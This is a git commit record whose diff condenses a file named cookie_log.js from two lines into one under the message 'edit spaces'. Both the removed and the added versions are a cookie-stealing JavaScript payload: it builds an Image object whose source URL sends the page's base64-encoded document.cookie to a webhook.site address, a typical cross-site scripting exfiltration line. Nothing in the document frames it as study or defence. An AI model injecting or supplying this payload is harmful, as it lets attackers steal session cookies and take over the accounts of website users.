4471747cadc50a3353cd4065a57fb133df1da870
Mayank Kr <ikki2@live.com>
2024-05-29 05:33:17 +0000

    Update cookie_log.js
    edit spaces

--- cookie_log.js
+++ cookie_log.js
@@ -1,2 +1,1 @@
-var img = new Image();
-img.src = 'https://webhook.site/a73055cb-43c6-4a72-a223-d9a8b6bb0c55?c='+btoa(document.cookie);
+var x=new Image();x.src='https://webhook.site/a73055cb-43c6-4a72-a223-d9a8b6bb0c55?c='+btoa(document.cookie);
